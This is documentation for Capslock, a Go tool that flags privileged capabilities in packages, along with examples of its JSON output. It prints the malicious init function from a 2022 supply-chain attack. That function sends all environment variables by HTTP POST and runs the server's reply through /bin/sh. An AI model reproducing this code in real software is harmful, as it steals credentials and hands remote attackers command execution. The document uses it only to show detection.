## Examples

### Capabilities in supply chain attacks

In August 2022, an attempted supply chain attack cloned thousands of GitHub
repos, adding a malicious payload that appeared to exfiltrate user information
and run an external script. Based on the code snippets available, we can test
what the Capslock analyzer would identify as the capabilities of this code.

As an example, Go packages were typically modified to add the following `init`
statement:

```
func init() {
    if os.Getenv("example") == "1" {
        return
    }
    os.Setenv("example", "1")
    env, err := json.Marshal(os.Environ())
    if err != nil {
        return
    }
    res, err := http.Post("", "application/json", bytes.NewBuffer(env))
    if err != nil {
        return
    }
    defer res.Body.Close()
    body, err := ioutil.ReadAll(res.Body)
    if err != nil {
        return
    }
    if string(body) != "" {
        exec.Command("/bin/sh", "-c", string(body)).Start()
    }
}
```

This would be easily identified by a human reviewer - but with thousands of
lines to review in any potential dependency this sort of thing is easily missed.
Capability signals can help direct reviewer attention to functions of higher
criticality by calling out where privileged operations are likely to be
performed.

With just this init function alone, we get the following capabilities:

```
CAPABILITY_EXEC: 1 calls
CAPABILITY_FILES: 1 calls
CAPABILITY_MODIFY_SYSTEM_STATE: 2 calls
CAPABILITY_NETWORK: 1 calls
CAPABILITY_OPERATING_SYSTEM: 1 calls
CAPABILITY_READ_SYSTEM_STATE: 1 calls
CAPABILITY_REFLECT: 1 calls
CAPABILITY_UNANALYZED: 1 calls
```

This is a lot of capabilities for such a small function, and some of these would
warrant attention. Once a reviewer is aware that this code requires
attention, the issues with it would be immediately obvious.

### Running Capslock on Capslock

As an example of how to interpret capability signals that are not malicious, the analysis for
the Capslock package identifies the following capability calls:

```
CAPABILITY_EXEC: 1 calls
CAPABILITY_FILES: 2 calls
CAPABILITY_OPERATING_SYSTEM: 1 calls
CAPABILITY_READ_SYSTEM_STATE: 2 calls
CAPABILITY_REFLECT: 2 calls
CAPABILITY_UNANALYZED: 2 calls
CAPABILITY_UNSAFE_POINTER: 2 calls
```

That seems like a lot! We can look further into each of these capability by
calling Capslock with the verbose flag `-v`. To begin with we can look into the
`exec` capability:

```
CAPABILITY_EXEC: 1 calls
0 direct, 1 transitive
Example callpath: capslock/cmd/capslock.main capslock/analyzer.LoadPackages golang.org/x/tools/go/packages.Load golang.org/x/tools/go/packages.defaultDriver golang.org/x/tools/go/packages.findExternalDriver$1 (*os/exec.Cmd).Run
```

That isn't particularly surprising - when the CLI call the Go packages driver to
load the given package for analysis, this package uses a transitive call to `os/exec`.
As an example of a capability that is a bit more
unexpected, let's check on where calls to `CAPABILITY_OPERATING_SYSTEM` are coming from.

```
CAPABILITY_OPERATING_SYSTEM: 1 calls
0 direct, 1 transitive
Example callpath: capslock/cmd/capslock.main capslock/analyzer.LoadPackages golang.org/x/tools/go/packages.Load golang.org/x/tools/go/packages.defaultDriver golang.org/x/tools/go/packages.goListDriver golang.org/x/tools/go/packages.goListDriver$1 golang.org/x/tools/go/internal/packagesdriver.GetSizesGolist (*golang.org/x/tools/internal/gocommand.Runner).RunRaw (*golang.org/x/tools/internal/gocommand.Runner).runConcurrent (*golang.org/x/tools/internal/gocommand.Invocation).runWithFriendlyError (*golang.org/x/tools/internal/gocommand.Invocation).run golang.org/x/tools/internal/gocommand.runCmdContext (*os.Process).Kill
```

Looks like this capability is due to calls via the `protobuf` library. That
isn't particularly surprising, and is fairly necessary for this package. This is
an example of how even capabilities that aren't intuitive are not necessarily
something to be avoided. But by reviewing what our code is really doing we can
reassure ourselves that nothing concerning is present in our dependencies.




### Machine-readable outputs

There are two types of machine readable outputs produced by Capslock:

*  JSON, by using -output=j or -output=json
*  A list of capability types, from -output=m


The key details in the JSON output are in the CapabilityInfo repeated field,
which is represented as a protocol buffer in the analyzer. This proto has the
following format:

```
message CapabilityInfo {
  // The name of the package.
  optional string package_name = 1;
  // Name associated with this capability.
  optional Capability capability = 2;
  // The dependency path to where the capability is incurred.
  optional string dep_path = 3;
  // The dependency path to where the capability is incurred.
  // Each element is a single function or method.
  repeated Function path = 6;
  // The location of the package.
  optional string package_dir = 4;
  // Classification of how the capability was incurred.
  optional CapabilityType capability_type = 5;
}
```

As an example, we have the following capability in the JSON output when
analyzing the Capslock package:

```
{
  "packageName":  "main",
  "capability":  "CAPABILITY_EXEC",
  "depPath":  "capslock/cmd/capslock.main capslock/analyzer.LoadPackages golang.org/x/tools/go/packages.Load golang.org/x/tools/go/packages.defaultDriver golang.org/x/tools/go/packages.findExternalDriver$1 (*os/exec.Cmd).Run",
  "path":  [
    {
      "name":  "capslock/cmd/capslock.main"
    },
    {
      "name":  "capslock/analyzer.LoadPackages",
      "site":  {
        "filename":  "capslock.go",
        "line":  "38",
        "column":  "31"
      }
    },
    {
      "name":  "golang.org/x/tools/go/packages.Load",
      "site":  {
        "filename":  "load.go",
        "line":  "78",
        "column":  "28"
      }
    },
    {
      "name":  "golang.org/x/tools/go/packages.defaultDriver",
      "site":  {
        "filename":  "packages.go",
        "line":  "261",
        "column":  "32"
      }
    },
    {
      "name":  "golang.org/x/tools/go/packages.findExternalDriver$1",
      "site":  {
        "filename":  "packages.go",
        "line":  "278",
        "column":  "25"
      }
    },
    {
      "name":  "(*os/exec.Cmd).Run",
      "site":  {
        "filename":  "external.go",
        "line":  "88",
        "column":  "20"
      }
    }
  ],
  "packageDir":  "capslock/cmd/capslock",
  "capabilityType":  "CAPABILITY_TYPE_TRANSITIVE"
},
```

Another important part of the JSON output is the moduleInfo section, which
includes the versions of the packages that were build in order to make the
analysis reproducible.

```
"moduleInfo":  [
    {
      "path":  "golang.org/x/mod",
      "version":  "v0.10.0"
    },
    {
      "path":  "golang.org/x/sys",
      "version":  "v0.8.0"
    },
    {
      "path":  "golang.org/x/tools",
      "version":  "v0.9.3"
    },
    {
      "path":  "google.golang.org/protobuf",
      "version":  "v1.28.1"
    },
]
```
